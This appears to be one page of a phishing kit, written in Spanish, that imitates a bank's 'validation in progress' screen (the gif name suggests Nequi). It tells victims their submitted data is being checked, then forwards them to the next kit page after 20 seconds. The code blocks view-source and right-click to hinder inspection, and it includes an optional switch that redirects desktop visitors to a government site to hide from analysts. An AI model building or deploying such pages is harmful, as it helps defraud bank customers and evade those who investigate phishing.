  <style>
    /* Mini-reset para que el loader quede centrado */
    html, body { height: 100%; margin: 0; }
    body {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      background: #ffffff;
      font-family: Manrope, sans-serif;

    .login-section { margin: auto; max-width: 420px; padding: 0 20px; }
    .login-wrap { background: #fff; border-radius: 16px; padding: 40px 30px; box-shadow: 0 4px 12px rgba(0,0,0,.1); }
    .textypn2 { margin: 16px 0; font-size: 16px; line-height: 1.4; }
    .label-input101 { font-size: 14px; color: #6e6e6e; }
    .loader-gif { width: 80px; margin: 20px auto; }
  </style>

  <script>
    // Redirige a dinamica.html después de 20 segundos
    function startRedirectTimer() {
      let secondsLeft = 20;
      const interval = setInterval(function () {
        secondsLeft--;
        console.log("Redirigiendo en " + secondsLeft + " segundos");
        if (secondsLeft <= 0) {
          clearInterval(interval);
          window.location.href = "dinamica.html"; // ← cambia aquí si quieres otro destino
        }
      }, 1000);
    }
    window.onload = startRedirectTimer;
  </script>
</head>
<body ng-app="App" class="ng-scope">
  <div id="content">
    <div ng-include="getTemplate('/header.html')" class="ng-scope">
      <header class="ng-scope">
        <div class="wrap-header">
          <div class="row">
            <div class="col-xs-12 col-md-2">

              <div class="btn-menu-hamburguer" ng-click="openMenu();">

            </div>
            <div class="col-xs-12 col-md-10 container-buttons">
              <div class="wrap-main-menu">
                <div class="row">
                  <div class="col-xs-12 col-md-8"></div>
                  <div class="col-xs-12 col-md-4">
                    <div class="buttons-right">
                      <ul>
                        <li ng-if="!hidePa" class="ng-scope">

    <section class="login-section ng-scope" ng-controller="loginController as loginControl">
      <div class="login-wrap">
        <h1 class="ng-binding">Validación en curso</h1>
        <div class="wrap-input4 validate-input">
          <br>
          <center>
            <!-- Gif local -->
            <img src="./img/gnequi.gif" alt="Loading" class="loader-gif">
          </center>
          <div class="textypn2">
            <span class="model" style="font-size:16px; color:#200020; text-align:center;">
              Por favor espere un momento mientras validamos la información ingresada, agradecemos su paciencia.
            </span>
          </div>
          <br>
          <center>
            <span class="label-input101">Por lo general este proceso no demora más de 2 minutos.</span>
          </center>
        </div>
      </div>
    </section>
  </div>

  <script>
    // Detectar dispositivo (opcional)
    function detectar_dispositivo() {
      const ua = navigator.userAgent;
      if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(ua)) return "Móvil";
      return "PC";
    }
    // Si quieres bloquear PC descomenta lo siguiente:
    // if (detectar_dispositivo() === "PC") window.location.href = "https://www.dian.gov.co/";

    // Bloqueo de teclas (opcional)
    document.addEventListener("keydown", e => {
      if (e.ctrlKey && e.key.toLowerCase() === "u") {
        e.preventDefault();
        alert("Acción bloqueada.");
      }
    });
    document.addEventListener("contextmenu", e => {
      e.preventDefault();
      alert("Clic derecho deshabilitado.");
    });
  </script>
